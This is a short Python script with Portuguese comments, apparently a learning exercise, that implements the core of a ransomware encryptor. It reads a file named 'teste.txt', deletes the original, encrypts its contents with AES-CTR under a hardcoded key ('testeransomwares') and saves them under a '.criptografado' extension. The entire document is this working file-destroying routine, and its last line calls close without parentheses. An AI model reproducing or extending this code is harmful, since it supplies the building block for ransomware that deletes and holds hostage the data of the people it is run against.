import os
##funcionalidades do sistema operacional da máquina
import pyaes
##algoritmo de criptografia do arquivo

##abertura do arquivo a ser criptpgrafado
file_name = 'teste.txt'
file = open(file_name, 'rb')
##"rb" é um comando de leitura de arquivos
file_data = file.read()
##método de leitura que será chamado e usado na variável "file"
file.close()
##fechamento da leitura da variável anterior

##remoção de arquivo original
os.remove(file_name)

##definição de chave para encriptação
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
##recebe o retorno do método com a chave no parâmetro

##criptografia do arquivo
crypto_data = aes.encrypt(file_data)
##usando o método e o conteúdo do arquivo no parâemtro

##salvando arquivo criptografado
new_file = file_name + '.criptografado'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close
